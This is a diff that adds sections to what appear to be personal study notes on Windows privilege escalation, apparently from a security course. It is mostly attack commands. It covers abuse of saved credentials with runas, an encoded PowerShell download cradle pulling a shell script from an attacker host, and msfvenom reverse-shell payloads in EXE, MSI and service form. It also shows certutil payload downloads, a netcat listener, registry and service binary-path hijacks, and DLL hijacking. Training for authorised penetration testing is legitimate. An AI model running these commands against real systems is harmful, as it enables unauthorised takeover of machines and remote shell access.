@@ -95,6 +95,170 @@ Start-Process -FilePath "powershell" -argumentlist "IEX(New-Object Net.webClient
 Invoke-AllChecks  # check for privesc
 
 ```
+
+# Run as / saved creds
+
+Identifying stored  credentials
+
+```
+cmdkey /list # search for stored creds
+
+runas /savecred /user:WORKGROUP\User "Program to execute" # run program as another user
+
+# flags
+
+/savecred # use saved cred
+/user # user workgroup and name
+
+```
+
+## encoding 
+convert powershell command to UTF-16LE 
+
+```
+echo -n "IEX(New-Object Net.WebClient).downloadString('http://10.10.10.10/shell.ps1')" | iconv --to-code UTF-16LE | base64 -w 0 # encode on attacker machine
+
+# on target
+runas /user:ACCESS\Administrator /savecred "powershell -EncodedCommand" <encoded string>
+
+```
+## dpapi creds
+
+ [good write-up on this](https://www.harmj0y.net/blog/redteaming/operational-guidance-for-offensive-user-dpapi-abuse/)
+
+# Autoruns
+As the path to the autorun can be modified, we replace the file with our payload. To execute it with elevated privileges we need to wait for someone in the Admin group to login.
+
+
+generate payload
+``
+`msfvenom -p windows/shell_reverse_tcp lhost=[Kali VM IP Address] -f exe -o program.exe`
+
+Replace program.exe with the autorun program 
+
+#  Registry Escalation - AlwaysInstallElevated
+
+Windows can allow low privilege users to install a Microsoft Windows Installer Package (MSI) with system privileges by the AlwaysInstallElevated group policy.
+
+## Detection
+
+```
+reg query HKCU\SOFTWARE\Policies\Microsoft\Windows\Installer /v AlwaysInstallElevated
+reg query HKLM\SOFTWARE\Policies\Microsoft\Windows\Installer /v AlwaysInstallElevated
+```
+
+## example
+
+Generate .msi payload using msfvenom
+
+`msfvenom -p windows/x64/shell_reverse_tcp LHOST=tun0 LPORT=443 -f msi -o shell.msi`
+Transfer file to the target using certutil
+`certutil -urlcache -f http://10.10.10.10/shell.msi shell.msi`
+Run listener
+`nc -lvnp 443`
+The following command can then be used to install the .msi file:
+
+```
+msiexec /quiet /qn /i file.msi
+
+# flags
+-   /quiet # quiet mode, which means there’s no user interaction required
+-   /qn # specifies there’s no UI during the installation process
+-   Specifies normal installation
+```
+
+
+# Weak Registry Permission
+
+In Windows, services have a registry keys and those keys are located at: `HKLM\SYSTEM\CurrentControlSet\Services\<service_name>`
+
+If **Authenticated Users** or **NT AUTHORITY\INTERACTIVE** have FullControl in any of the services, in that case, you can change the binary that is going to be executed by the service.
+
+## Detection
+
+1. Open powershell prompt and type:
+`Get-Acl -Path hklm:\System\CurrentControlSet\services\regsvc | fl`
+
+2. Notice that the output suggests that user belong to
+`“NT AUTHORITY\INTERACTIVE”`  has “FullContol” permission over the registry key.`
+
+![[Pasted image 20230112221435.png]]
+
+
+## Exploitation
+Modify the `ImagePath` key of the registry to your payload path and restart the service.
+
+```
+reg add HKLM\SYSTEM\CurrentControlSet\services\regsvc /v ImagePath /t REG_EXPAND_SZ /d c:\Temp\shell.exe /f
+
+# restart service
+sc start regsvc
+```
+
+
+# Weak Folder Permissions
+
+If a user has write permission in a folder used by a service, he can replace the binary with a malicious one. When the service is restarted the malicious binary is executed with higher privileges.
+
+## Detection
+
+![[Pasted image 20230112222839.png]]
+ Notice that the “Everyone” user group has “FILE_ALL_ACCESS” permission on the filepermservice.exe file.
+ 
+## Exploitation 
+
+Generate msfvenom payload and upload it to the target then Replacing the file by copying the payload to the service binary location. Restart the service to execute the payload with higher privilege.
+
+```
+copy /y C:\Users\user\Desktop\shell.exe "c:\Program Files\File Permissions Service\filepermservice.exe"
+sc start filepermsvc
+```
+
+#  Weak Service Permissions
+
+If the group “Authenticated users” has **SERVICE_ALL_ACCESS** in a service, then it can modify the binary that is being executed by the service.
+
+![[Pasted image 20230112223213.png]]
+
+Generate msfvenom payload
+
+`msfvenom -p windows/shell_reverse_tcp LPORT=9001 LHOST=<kali ip> -f exe-service > shell.exe`
+
+
+When Windows makes a call to start a service, it calls the ServiceMain function and expects a return from this call. If you don’t specify exe-service, the generated payload won’t be able to give you a persistent shell.
+
+Modify the config using and start the service to execute the payload.
+
+`sc config daclsvc binpath= "C:\Users\user\Desktop\shell.exe"`
+
+![[Pasted image 20230112223413.png]]
+
+
+# Startup Applications
+
+
+# DLL Hijacking
+
+A windows program looks for DLLs when it starts. If these DLL’s do not exist then it is possible to escalate privileges by placing a malicious DLL in the location where the application is looking for.
+
+Generally, a Windows application will use pre-defined search paths to find DLL’s and it will check these paths in a specific order.
+
+1. The directory from which the application loaded  
+2. 32-bit System directory (C:\Windows\System32)  
+3. 16-bit System directory (C:\Windows\System)  
+4. Windows directory (C:\Windows)  
+5. The current working directory (CWD)  
+6. Directories in the PATH environment variable (first system and then user)
+
+PowerUp has detected a potential DLL hijacking vulnerability.
+
+![[Pasted image 20230113001753.png]]
+And we can use Write-HijackDll function using PowerUp
+
+`Write-HijackDll -DllPath 'C:\Temp\wlbsctrl.dll'`
+
+
+
 ---
 Tags: #tcm-security #Windows_priv_esc 
 Resources:
